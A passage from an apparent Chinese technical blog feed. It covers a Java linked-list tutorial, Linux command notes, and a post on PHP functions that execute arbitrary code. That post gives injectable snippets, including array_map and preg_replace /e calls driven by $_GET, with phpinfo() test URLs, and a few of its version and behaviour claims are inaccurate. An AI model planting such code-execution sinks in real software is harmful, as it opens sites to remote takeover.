class="hljs-string">&quot;正在启动: &#123;&#125;...&quot;</span>.<span class="hljs-built_in">format</span>(thread.name))<br>            thread.start()<br>            thread.join()<br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在终止...&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>网络爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP中一些任意代码执行的相关函数介绍</title>
    <link href="/2022/09/30/runcode/"/>
    <url>/2022/09/30/runcode/</url>
    
    <content type="html"><![CDATA[<p><em>注意:在以下函数中,回调函数一般总是会被执行</em></p><h3 id="assert"><a href="#assert" class="headerlink" title="assert :"></a>assert :</h3><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p><hr><p>PHP 5 和 7</p><p>assert(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$assertion</code>, string <code>$description</code> &#x3D; ?): bool</p><p>PHP 7</p><p>assert(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$assertion</code>, <a href="https://www.php.net/manual/zh/class.throwable.php">Throwable</a> <code>$exception</code> &#x3D; ?): bool</p><hr><p>示例:</p><p>assert(‘phpinfo()’);</p><h3 id="array-fileter"><a href="#array-fileter" class="headerlink" title="array_fileter:"></a>array_fileter:</h3><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 array 数组中</p><p>array_filter(array <code>$array</code>, ?<a href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> <code>$callback</code> &#x3D; <strong><code>null</code></strong>, int <code>$mode</code> &#x3D; 0): </p><p>参数:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br><br>```<br>array<br>```<br><br>要遍历的数组<br><br>```<br>callback<br>```<br><br>使用的回调函数<br><br>如果没有提供 `callback` 回调函数，将删除数组中 `array` 的所有“空”元素。<br></code></pre></td></tr></table></figure><p>示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>= [<span class="hljs-number">1</span>];<br><br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$a</span>, <span class="hljs-title function_ invoke__">phpinfo</span>());<br></code></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">array_map() 返回一个 array，包含将<span class="hljs-built_in"> array </span>的相应值作为回调的参数顺序调用 callback 后的结果（如果提供了更多数组，还会利用 arrays 传入）。callback 函数形参的数量必须匹配 array_map() 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 ArgumentCountError。<br></code></pre></td></tr></table></figure><p>array_map(?callable $callback, array $array, array …$arrays): array</p><p>参数:</p><p>callback</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">回调函数 callable，应用到每个数组里的每个元素。<br><br>多个数组操作合并时，callback 可以设置为 null。 如果只提供了<span class="hljs-built_in"> array </span>一个数组， array_map() 会返回输入的数组。<br></code></pre></td></tr></table></figure><p>array</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">数组，遍历运行 callback 函数。<br></code></pre></td></tr></table></figure><p>arrays</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">额外的数组列表，每个都遍历运行 callback 函数。<br></code></pre></td></tr></table></figure><p>示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new_array</span>;<br><br><span class="hljs-comment">//传入参数参考这里: http://www.localhost.com/daima.php/?cmd=1&amp;func=phpinfo</span><br></code></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p> 把第一个参数作为回调函数调用</p><p>call_user_func(callable $callback, mixed …$args): mixed</p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>通过执行代码字符串创建动态函数</p><p>create_function(string <code>$args</code>, string <code>$code</code>): string</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">注意:该函数已自 PHP 7.2.0 起被<span class="hljs-strong">*废弃*</span>，并自 PHP 8.0.0 起被<span class="hljs-strong">*移除*</span>。 强烈建议不要依赖本函数。<br></code></pre></td></tr></table></figure><p>示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-string">&#x27;echo phpinfo();&#x27;</span>);<br><span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>php语言构造器</p><h3 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h3><p>使用用户自定义的比较函数对数组中的值进行排序</p><p>usort(array &amp;$array, callable $callback): bool</p><p>示例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$a</span>,<span class="hljs-title function_ invoke__">phpinfo</span>());<br></code></pre></td></tr></table></figure><h3 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h3><p>使用用户自定义的比较函数，保持索引和值的对应关系，原地排序 array。</p><p>uasort(array &amp;$array, callable $callback): bool</p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>当正则表达式有e参数,PHP版本在5.7以下,且匹配成功时好用</p><p>示例:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;</span><br><span class="language-php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>, <span class="hljs-string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>, <span class="hljs-variable">$data</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">//这里的data值参考: http://localhost:63342/shell.php/daima.php?data=<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>$&#123;Bphpinfo()&#125;;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PHP相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Java实现链表结构</title>
    <link href="/2022/08/19/link./"/>
    <url>/2022/08/19/link./</url>
    
    <content type="html"><![CDATA[<blockquote><p>用Java实现链表相较于用C++实现链表结构更为简易，Java中没有指针概念，通过对象这种引用的基本类型即可实现。以下是我用Java语言实现的链表结构写法，在这里做个记录</p></blockquote><h4 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h4><p>先编写一个ListNode类，用于实现链表结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> &#123;<br>    <span class="hljs-type">int</span> data;<br>    ListNode next;<br>    ListNode(<span class="hljs-type">int</span> x)&#123;<br>        data = x;<br>    &#125;<br><br>    <span class="hljs-comment">//添加节点的操作方法实现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">AddNode</span><span class="hljs-params">(<span class="hljs-type">int</span> newdata)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.next==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-built_in">this</span>.next= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(newdata);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.next.AddNode(newdata);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//打印链表的方法实现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">PrintNode</span><span class="hljs-params">()</span>&#123;<br>        System.out.print(<span class="hljs-built_in">this</span>.data);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.next!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.print(<span class="hljs-string">&quot;-&gt;&quot;</span>);<br>            <span class="hljs-built_in">this</span>.next.PrintNode();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h4><p>再编写一个测试类，进行实践测试验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;请输入创建链表的节点个数&quot;</span>);<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">NodeNumber</span> <span class="hljs-operator">=</span> input.nextInt();<br>        <span class="hljs-type">int</span>[] num = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[NodeNumber];<br>        System.out.println(<span class="hljs-string">&quot;请输入第&quot;</span> + <span class="hljs-number">1</span> + <span class="hljs-string">&quot;个节点的数值 -----注意: 仅接收整型数据&quot;</span>);<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">input1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-type">ListNode</span> <span class="hljs-variable">Node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(input1.nextInt());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; i &lt;= NodeNumber; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;请输入第&quot;</span> + i + <span class="hljs-string">&quot;个节点的数值 -----注意: 仅接收整型数据&quot;</span>);<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">input2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>            Node.AddNode(input2.nextInt());<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;开始打印链表&quot;</span>);<br>        Node.PrintNode();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入测试数据后，程序运行结果如下图所示：</p><p><img src="/images/0a2b57cfc83679259f7729edca34c57.png" alt="0a2b57cfc83679259f7729edca34c57"></p>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux常用命令汇总</title>
    <link href="/2022/06/10/linux/"/>
    <url>/2022/06/10/linux/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="创建用户-useradd"><a href="#创建用户-useradd" class="headerlink" title="创建用户   useradd"></a>创建用户   useradd</h3><h4 id="useradd-参数-用户名"><a href="#useradd-参数-用户名" class="headerlink" title="useradd [-参数] 用户名"></a>useradd [-参数] 用户名</h4><p>可选参数:</p><p>-g 指定用户组           列如 -g 用户组gid ,-g 用户组名字</p><p>-u 指定用户uid         uid&#x3D;0默认为root用户,即用有管理员权限</p><p>-d 指定用户家目录   -d&#x2F;想要指定家目录的绝对路径 使用-d参数会创建存放用户配置的文件 例如 useradd -d &#x2F;var&#x2F;test&#x2F; 该命令会在&#x2F;var目录下创建文件夹test用来存放用户配置</p><p>注意:若存放用户配置文件的文件夹已经存在,系统不会从 skel 目录里向其中复制任何文件。这样创建出来的用户不能正常使用</p><p>&#x2F;etc&#x2F;skel存放着用户的配置文件</p><p>-l    该参数表示不要将用户添加到最近登录和登录失败数据库。</p><p>-e  指定用户帐户将被禁用的日期。日期是以YYYY&#x2F;MM&#x2F;DD格式指定。</p><p> -f   指定密码过期后，账户被彻底禁用之前的天数。0 表示立即禁用，-1表示禁用这个功能。</p><p>-D 更改新用户创建时的配置信息,如过期时间等</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/etc/</span>passwd<br>    用户账户信息。<br><br><span class="hljs-regexp">/etc/</span>shadow<br>    安全用户账户信息。<br><br><span class="hljs-regexp">/etc/g</span>roup<br>    组账户信息。<br><br><span class="hljs-regexp">/etc/g</span>shadow<br>    安全组账户信息。<br><br><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/useradd<br>    账户创建的默认值。<br><br><span class="hljs-regexp">/etc/</span>skel/<br>    包含默认文件的目录。<br>    <br><span class="hljs-regexp">/etc/g</span>roup<br>        组账户信息。<br><br><span class="hljs-regexp">/etc/g</span>shadow<br>        安全组账户信息。<br><br><span class="hljs-regexp">/etc/</span>login.defs<br>        Shadow 密码套件配置。<br><br><span class="hljs-regexp">/etc/</span>passwd<br>        用户账户信息。<br><br><span class="hljs-regexp">/etc/</span>shadow<br>        安全用户账户信息。<br><br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;default&#x2F;useradd存放着用户创建的默认配置信息</p><h3 id="usermod-参数-用户名"><a href="#usermod-参数-用户名" class="headerlink" title="usermod [-参数] 用户名"></a>usermod [-参数] 用户名</h3><p>-L ,–lock  锁定用户,使用该参数修改后的用户不允许远程登录主机</p><p>-U,–unlock 解锁被锁定的用户,与-L参数相对应</p><h3 id="change-M"><a href="#change-M" class="headerlink" title="change -M"></a>change -M</h3><p>修改用户密码过期时间,也可以通过vim &#x2F;etc&#x2F;login.defs 修改该文件来设置用户密码的过期时间</p><h3 id="静态显示进程信息-ps命令"><a href="#静态显示进程信息-ps命令" class="headerlink" title="静态显示进程信息 ps命令"></a><strong>静态显示进程信息 ps命令</strong></h3><p>linux上进程有5种状态:</p><ol><li><p>运行(正在运行或在运行队列中等待)</p></li><li><p>中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号)</p></li><li><p>不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生)</p></li><li><p>僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放)</p></li><li><p>停止(进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行)</p></li></ol><p>格式   ps [options]</p><p>-A 显示所有进程,无论是否运行</p><p>-a 显示当前用户正在运行的进程</p><p>a 进一步显示-a展示的信息</p><p>r 仅显示正在运行的命令</p><p>T 显示与此终端相关的所有进程</p><p>U 按有效用户ID（EUID）或名称选择。这将选择有效用户名或ID位于userlist中的进程。</p><p>-U 按真实用户ID（RUID）或名称选择。它选择其真实用户名或ID在用户列表中。</p><p>x  显示所有程序，不以终端机来区分。</p><p>u  以用户为主的格式来显示程序状况。</p><h3 id="ps-aux"><a href="#ps-aux" class="headerlink" title="ps aux"></a>ps aux</h3><p>ps默认情况下仅显示终端连接过程。 如果要显示其他未连接到终端的进程，可以使用<strong>x</strong>选项。</p><p># a 选项也会打印所有其他用户进程。</p><p># u 显示进程所有者。</p><p># x 显示其他未连接到终端的进程</p><p><img src="/images/255ba607230cb4f209dc8068a00933e.png" alt="255ba607230cb4f209dc8068a00933e"></p><p>USER 进程的属主；</p><p>PID 进程的ID；</p><p>PPID 父进程；</p><p>%CPU 进程占用的CPU百分比；</p><p>%MEM 占用内存的百分比；</p><p>NI 进程的NICE值，数值大，表示较少占用CPU时间；</p><p>VSZ 进程使用的虚拟內存量（KB）；</p><p>RSS 该进程占用的固定內存量（KB）（驻留中页的数量）；</p><p>TTY 该进程在那個終端上運行（登陸者的終端位置），若與終端無關，則顯示（？）。<br>若为pts&#x2F;0等，则表示由网络连接主机进程</p><p>WCHAN 当前进程是否正在進行，若为-表示正在進行；</p><p>START 該進程被觸發启动时间；</p><p>TIME 該进程實際使用CPU運行的时间；</p><p>COMMAND 命令的名称和参数；</p><p>STAT狀態位常見的狀態字符<br>————————————————</p><h3 id="groupadd命令"><a href="#groupadd命令" class="headerlink" title="groupadd命令"></a>groupadd命令</h3><p>用法：groupadd [选项]  组</p><p>选项:<br>  -f, –force                         如果组已经存在则成功退出,并且如果 GID 已经存在则取消 -g<br>  -g, –gid GID                                 为新组使用 GID<br>  -h, –help                                      显示此帮助信息并推出<br>  -K, –key KEY&#x3D;VALUE                  不使用 &#x2F;etc&#x2F;login.defs 中的默认值<br>  -o, –non-unique                         允许创建有重复 GID 的组<br>  -p, –password PASSWORD       为新组使用此加密过的密码<br>  -r, –system                                   创建一个系统账户</p><h3 id="groupmod-命令"><a href="#groupmod-命令" class="headerlink" title="groupmod 命令"></a>groupmod 命令</h3><p>用法：groupmod [选项] 组</p><p>选项:<br>  -g, –gid GID                                     将组 ID 改为 GID<br>  -h, –help                                          显示此帮助信息并推出<br>  -n, –new-name NEW_GROUP      改名为 NEW_GROUP</p><h3 id="vim-编辑命令"><a href="#vim-编辑命令" class="headerlink" title="vim 编辑命令"></a>vim 编辑命令</h3><ul><li><p>在命令模式下</p></li><li><p>dd 表示删除整行</p></li><li><p>&#x2F;字符串 表示查找目标字符串</p></li><li><p>跳到第一行的第一个字符：按两次“g”</p></li><li><p>跳转到当前行的第一个字符：在当前行按“0”</p></li><li><p>跳到文本的最后一行：shift+g</p></li><li><p>跳到最后一行的最后一个字符： shift+g  shift+4</p></li><li><p>显示当前行号： :nu</p></li><li><p>显示所有行号： :set nu</p></li><li><p>强制保存并退出:   wq!</p></li></ul><h3 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h3><p>使普通用户执行某些ROOT用户才能执行的命令</p><p>sudo -l 查询当前用户可以执行哪些命令</p><p>vim &#x2F;etc&#x2F;sudoers 设置普通用户的sudo命令</p><p><img src="/images/a53e4b98219e6f2637d46f25ec4139a.png" alt="a53e4b98219e6f2637d46f25ec4139a"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>root    ALL&#x3D;(ALL)       ALL</p><ul><li><p>用户名 IP地址&#x3D;以什么身份执行命令   执行的命令 </p></li><li><p>示例:root  192.168.31.243&#x3D;(ALL)       &#x2F;usr&#x2F;bin&#x2F;vim , &#x2F;bin&#x2F;chgrp</p></li></ul><p>%wheel        ALL&#x3D;(ALL)       NOPASSWD: ALL </p><ul><li>该命令表示处于该组用户能以任何身份执行任何命令</li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="一次性计划-at"><a href="#一次性计划-at" class="headerlink" title="一次性计划 at"></a>一次性计划 at</h4><p>示例:</p><p><img src="/images/2f812cdd7ab1245c8f49f4b5a6d3eb2.png" alt="2f812cdd7ab1245c8f49f4b5a6d3eb2"></p><h4 id="crontab-周期性计划"><a href="#crontab-周期性计划" class="headerlink" title="crontab  周期性计划"></a>crontab  周期性计划</h4><p><img src="/images/bf752a107a86b3681bdc02f500e9932.png" alt="bf752a107a86b3681bdc02f500e9932"></p><p><img src="/images/c738b237b88afd85b4fe5c3c797840a.png" alt="c738b237b88afd85b4fe5c3c797840a"></p><p><img src="/images/45fc09fcde253422c3a9ae5a3f5978a.png" alt="45fc09fcde253422c3a9ae5a3f5978a"></p><p>可编写脚本文件通过crontab命令配置执行</p><p>crontab -l 查看设置的计划任务</p><p>crontab -r 清除任务计划</p><h3 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h3><p>find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p><p>语法<br>find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} ;<br>参数说明 :</p><p>find 根据下列规则判断 path 和 expression，在命令列上第一个 - ，-option 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。</p><p>expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。</p><p>-o 连接符  即多次查询 </p><p>find &#x2F;  -type f -name “<em>.config” -o -type f -name “</em>.txt” |grep “config”</p><p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p><p>-amin n : 在过去 n 分钟内被读取过</p><p>-anewer file : 比文件 file 更晚被读取过的文件</p><p>-atime n : 在过去n天内被读取过的文件</p><p>-cmin n : 在过去 n 分钟内被修改过</p><p>-cnewer file :比文件 file 更加新的文件</p><p>-ctime n : 在过去n天内被修改过的文件</p><p>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</p><p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p><p>-name name, -iname name : 文件名称符合 name 的文件，iname 会忽略大小写</p><p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</p><p>-type c : 文件类型是 c 的文件。</p><p>-: 常规文件</p><p>d: 目录</p><p>c: 字符设备文件</p><p>b: 块设备文件</p><p>p: 管道文件</p><p>l: 符号连结</p><p>s: socket 套接字文件</p><h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><p>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:</p><p># find . -name “*.c”</p><p>将当前目录及其子目录中的所有文件列出：</p><p># find . -type f</p><p>将当前目录及其子目录下所有最近 20 天内更新过的文件列出:</p><p># find . -ctime -20</p><p>查找 &#x2F;var&#x2F;log 目录中更改时间在 7 日以前的普通文件，并在删除之前询问它们：</p><p># find &#x2F;var&#x2F;log -type f -mtime +7 -ok rm {} ;</p><p>查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：</p><p># find . -type f -perm 644 -exec ls -l {} ;</p><p>查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径：</p><p># find &#x2F; -type f -size 0 -exec ls -l {} ;</p><h4 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h4><p>find &#x2F;etc&#x2F; -name passwd      ##查找&#x2F;etc&#x2F;下名称中带有passwd的文件</p><p>find &#x2F;etc -maxdepth 1 -name passwd     ##查找&#x2F;etc&#x2F;下名称中带有passwd的文件，查找一层。</p><p>find &#x2F;etc -name <em>.conf       ##查找&#x2F;etc&#x2F;下名称中带有</em>.conf的文件(下面显示的是部分)</p><p>find &#x2F;etc -maxdepth 2 -name <em>.conf  ##查找&#x2F;etc&#x2F;下名称中带有</em>.conf的文件，且查找两层，包括一层（下面显示的是部分）</p><p>find &#x2F;etc -maxdepth 2 -mindepth 2 -name <em>.conf  ##查找&#x2F;etc&#x2F;下名称中带有</em>.conf的文件，且只查找第二层</p><p>find &#x2F;home -group jaking             ##查找&#x2F;home中所有组是jaking用户的文件</p><p>find &#x2F;home -user jaking -group jaking  ##查找&#x2F;home中所有人和所有组都是jaking的文件</p><p>find &#x2F;home -not -user jaking      ##查找&#x2F;home中所有人不是jaking用户的文件</p><p>find &#x2F;home -not -user jaking -o -group cephadm   ##查找&#x2F;home中所有人不是jaking用户或者所有组是cephadm用户的文件</p><p>find &#x2F;home -size 20K       ##查找&#x2F;home文件大小近似20k的文件</p><p>find &#x2F;home -size +20K      ##查找&#x2F;home文件大小大于20k的文件</p><p>find &#x2F;home -size -20K      ##查找&#x2F;home文件大小小于20k的文件</p><p>find &#x2F;home -type d         ##按type查找&#x2F;home中目录</p><p>find &#x2F;home -type f         ##按type查找&#x2F;home中文件</p><p>find &#x2F;home -cmin 10        ##查找&#x2F;home中十分钟左右修改的</p><p>find &#x2F;home -cmin +10       ##查找&#x2F;home中十分钟以上修改的</p><p>find &#x2F;home -cmin -10       ##查找&#x2F;home中十分钟以内修改的</p><p>find &#x2F;home -ctime 10       ##查找&#x2F;home中十天左右修改的</p><p>find &#x2F;home -ctime +10      ##查找&#x2F;home中十天以上修改的</p><p>find &#x2F;home -ctime -10      ##查找&#x2F;home中十天以内修改的</p><p>find &#x2F;home&#x2F; -perm 444      ##查找&#x2F;home文件权限为444的文件</p><p>find &#x2F;home&#x2F; -perm -444     ##查找&#x2F;home中user有读的权限且group有读的权限且other有读的权限的文件。（三个条件，u.g.o至少要读的权限即r–r–r–）</p><p>find &#x2F;home&#x2F; -perm -004     ##查找&#x2F;home中other有读权限的文件（一个条件,o至少有读的权限）</p><p>find &#x2F;home&#x2F; -perm -644     